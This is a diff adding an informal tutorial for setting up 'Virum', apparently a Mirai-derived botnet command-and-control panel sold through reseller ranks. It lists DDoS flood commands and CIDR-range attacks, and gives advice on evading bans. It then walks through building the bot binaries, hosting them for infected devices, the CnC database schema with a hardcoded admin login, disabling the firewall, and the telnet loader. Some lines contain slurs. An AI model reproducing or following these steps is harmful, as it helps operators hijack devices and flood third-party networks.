@@ -1,0 +1,315 @@
+/*
+
+This project was possible thanks to @nto.vision, @iot.js and @sourceovh.
+Tutorial By @nto.vision >:)
+VPS Paid For By Brewingcoffee That Nigga Is Lit
+[Virum release version 8.5]
+
+  Recommendations before starting!
+    Use a server with 8 Gigs ram.
+    Use two separate servers for bins and cnc in order for you not getting banned.
+    Use a reverse proxy. 
+  Needs
+    CentOS 7 server.
+    Brain and being able to read lol.
+  Dont be a stupid ass skid read the tut LOL
+
+  [Features of virum]
+    -Broadcast system.
+    -Private message system.
+    -Kicking system with custom message.
+    -Expiry system.
+    -General stats of over all attacks.
+    -Spam detection.
+    -Rank system.
+      Rank system has 10 levels that include staff ranks, reseller ranks, vip ranks and normal users.
+      Each rank has its own privileges. 
+    -Customizable color gui for each user.
+    -Customizable prompt for each user.
+    -Multi flood system enabled for VIP and ranks upper. (Attack multiple targets)
+    -CIDR range attack enabled to max vip member.
+    -Easy configuration setup located in /root/virum-0/configurations
+    -Sounds implemented for wrong commands or wrong stuff.
+    -All mirai crashes fixed.
+    -Failsafe system if it crashes it will come back asap.
+    -Clean menu, login and print commands. 
+    -Footer stats, constant footer. 
+    -Global ongoing attack system.
+    -Follow up on who adds who, giving hability to make resellers remove their customers without removing anyone else customers 
+    -In net password change
+    -Anti sql injection system. 
+    
+
+  [Commands for virum]
+    [Attack]
+    (All attack commands can be modified with flags such as dport)
+    .syn
+    .greip
+    .psh
+    .std
+    .plain
+    .raw
+    .udprand
+    .udphex
+    .psh
+    .udppush
+    .raptor
+    .kriticos
+    .incognita
+    [GOD commands]
+    .lock
+      Will enable ipset whitelist and will blacklist all incoming ips that get blocked by reverse proxy filter, will only work if you have a reverse proxy.
+    .unlock
+      Will disable this lockdown mode.
+    .addadmin
+      Self explanatory
+    .addmember
+      Add vip member
+    .addbasic 
+      adds a basic account
+    .addmoderator
+      Self explanatory
+    .addreseller
+      Self explanatory.
+    .addmonth
+      Self explanatory
+    .reactivate 
+      Set expiry date.
+    .kick 
+      Self explanatory
+    .pm 
+      Self explanatory
+    .kickall
+      Self explanatory.
+    .removeall
+      Removes all users added by a certain user.
+    .whitelist
+      Whitelists ips against attacks. Please dont use if you dont know how CIDR ranges work.
+    .removeuser
+      Self explanatory
+    .rwhitelist
+      Self explanatory
+    [Admin commands]
+    Has almost all the god commands except for few like lock and pm.
+    [Moderato commands]
+    .removeuser
+      Self explanatory
+    .addbasic 
+      Self explanatory
+    [Reseller]
+    .addbasic 
+      Self explanatory
+    .removeuser 
+      Self explanatory 
+    [Member]
+    Basic attack commands
+    [Basic] 
+    Basic attack commands and all users have access to commands such as 
+    .setcolor
+    .prompt 
+    .passwd 
+
+    
+  
+
+Make sure to drop all files inside of a directory called virum-0 in root directory. [!]
+
+
+
+
+
+*/
+
+
+
+
+
+
+
+// First steps we will copy this and paste it in our server.
+
+cd ~/virum-0/
+chmod 777 Setp1.sh && sh Setp1.sh
+
+
+
+
+// If you want to use mirai telnet loader change the contents in loader/src/headers/config.g and details in dlr.
+If yall cant do this i can drop a tut lmk in the comments skiddos >:)
+
+Now dont go thinkin you can buy a simple 1 core 2 gb server to run virum LOL the functions alone will lag you unless you get the minimun of like 8, so dont be broke if you really tryna use this src bitches im only usin this dog server to show you how to setup!
+
+ViruM2020!.
+MeCg7w&d+WFs
+// Now We Install MySQL
+
+
+service mysqld restart
+cat /var/log/mysqld.log | grep 'temporary password'
+cat databasepass.txt
+
+
+
+// Copy the value that is prompted after cat command. 
+// You will need the database password located in /root/virum-0/databasepass.txt after giving the temporary password for mysql.
+
+// Make sure to remember or copy before the password you chose you will need it later. SAVE IT!
+mysql_secure_installation
+
+mysql -u root -p
+
+
+
+
+// Paste This Entire DB Into MySQL
+
+CREATE DATABASE Virum;
+use Virum;
+CREATE TABLE `history` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `user_id` int(10) unsigned NOT NULL,
+  `time_sent` int(10) unsigned NOT NULL,
+  `duration` int(10) unsigned NOT NULL,
+  `command` text NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  PRIMARY KEY (`id`),
+  KEY `user_id` (`user_id`)
+);
+ 
+CREATE TABLE `users` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `username` varchar(32) NOT NULL,
+  `password` varchar(32) NOT NULL,
+  `duration_limit` int(10) unsigned DEFAULT NULL,
+  `cooldown` int(10) unsigned NOT NULL,
+  `wrc` int(10) unsigned DEFAULT NULL,
+  `last_paid` int(10) unsigned NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  `admin` int(10) unsigned DEFAULT '0',
+  `max_day` int(2) unsigned DEFAULT '0',
+  `max_month` int(2) unsigned DEFAULT '0',
+  `max_year` int(4) unsigned DEFAULT '0',
+  `intvl` int(10) unsigned DEFAULT '30',
+  `api_key` text,
+  `addedby` text,
+  `color` text NOT NULL,
+  `muted` int(1) unsigned DEFAULT '0',
+  `prompt` int(10) unsigned DEFAULT '0',
+  `connected` int(1) unsigned DEFAULT '0',
+
+  
+
+  PRIMARY KEY (`id`),
+  KEY `username` (`username`)
+);
+CREATE TABLE `whitelist` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
+ 
+CREATE TABLE `messages` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `user_id` int(10) unsigned NOT NULL,
+  `message` text NOT NULL,
+  PRIMARY KEY (`id`),
+  KEY `user_id` (`user_id`)
+);
+CREATE TABLE `attacks` (
+  `id` int(10) unsigned DEFAULT '0',
+  `newcount` int(10) unsigned DEFAULT '0',
+  PRIMARY KEY (`id`),
+  `lastusr` text,
+  `lastdur` int(10) unsigned NOT NULL,
+  KEY `newcount` (`newcount`)
+);
+CREATE TABLE `apiattacks` (
+  `id` int(10) unsigned DEFAULT '0',
+  `newcount` int(10) unsigned DEFAULT '0',
+  PRIMARY KEY (`id`),
+  KEY `newcount` (`newcount`)
+);
+INSERT INTO `users` (`username`, `password`, `duration_limit`, `cooldown`, `wrc`, `last_paid`, `max_bots`, `admin`, `max_day`, `max_month`, `max_year`, `intvl`, `api_key`, `addedby`, `color`, `muted`, `prompt`, `connected`)
+  VALUES ('thar', 'pendejos', '100000000', '0', '0', '0', '-1', '10', '1', '1', '9999', '30', NULL, 'Console', 'red', '0', '2', '0');
+
+INSERT INTO attacks VALUES (0, 0, 'Console', 0);
+INSERT INTO apiattacks VALUES (0, 0);
+
+CREATE TABLE `logins` (
+  `id` int(11) NOT NULL,
+  `username` varchar(32) NOT NULL,
+  `action` varchar(32) NOT NULL,
+  `ip` varchar(15) NOT NULL,
+  `timestamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
+exit;
+
+
+
+// Now We Disable and restart services
+
+service iptables stop 
+service httpd restart  
+service mysqld restart
+
+//Now we change this file
+
+nano /usr/include/bits/typesizes.h
+
+
+scroll down and edit the 1024 to 999999
+THEN SAVE IT ctr+x ctr+y then hit enter to save!
+ulimit -n999999; ulimit -u999999 ulimit -e999999
+
+// Alright, we have to compile the bot. This will have output into a directory in root folder, if you are going to use same server to host your bins just move bins to /var/www/html folder but if you will use another server move bins to the other server to your http server
+
+cd ~/virum-0/
+chmod 777 *
+sh build.sh
+Ignore errors they mean nothing.....
+bot port is 7854 skiddos obv telnet connection
+//To see if bins workin on bin server
+
+tail -f /var/log/httpd/access_log
+
+
+
+//Check if dupes command.
+
+netstat -tn 2>/dev/null | grep :7854 | grep ESTAB | awk '{print $7}' | sort | uniq -c | sort -n
+
+
+
+-----------------------------------------
+If yall need help with these aswell LMK in the comments :) now lets take a look around the src
+Commands to install PHPMyAdmin:
+
+yum update -y && yum install httpd php wget nano -y && service iptables stop && chkconfig iptables off
+sudo yum install epel-release -y
+yum update
+yum install httpd mysql-server php  -y
+service mysql start
+yum install php
+yum install phpmyadmin -y
+
+nano /etc/httpd/conf.d/phpMyAdmin.conf
+change ip
+
+service httpd restart
+
+ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'ThePassyouchoe';
+
+lsof | grep awoo.sh 
+kill #
+---------------------------------------------
+Install adminer <3 
+
+yum install php -y
+yum install php-cli 0y
+yum install php-mysql -y
+cd /var/www/html/
+wget https://github.com/vrana/adminer/releases/download/v4.7.7/adminer-4.7.7.php -O ad.php
+chmod 777 ad.php
+service httpd restart
